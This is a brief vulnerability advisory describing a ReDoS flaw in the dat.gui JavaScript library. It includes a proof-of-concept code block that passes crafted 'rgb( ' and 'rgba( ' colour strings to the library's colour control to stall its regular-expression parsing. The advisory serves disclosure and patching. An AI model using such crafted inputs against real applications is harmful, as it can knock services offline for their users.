# Overview

`dat.gui` is s lightweight graphical user interface for changing variables in JavaScript. This package is vulnerable to Regular Expression Denial of Service (ReDoS) via. specifically crafted `rgb` and `rgba` values.

# Proof of Concept

```
var gui = new dat.gui.GUI();
var Options = function() {
this.color0 = "rgb( "; // CSS string
};

window.onload = function() {
var options = new Options();
gui.addColor(options, 'color0');
};

var gui = new dat.gui.GUI();
var Options = function() {
this.color0 = "rgba( "; // CSS string
};

window.onload = function() {
var options = new Options();
gui.addColor(options, 'color0');
};
```
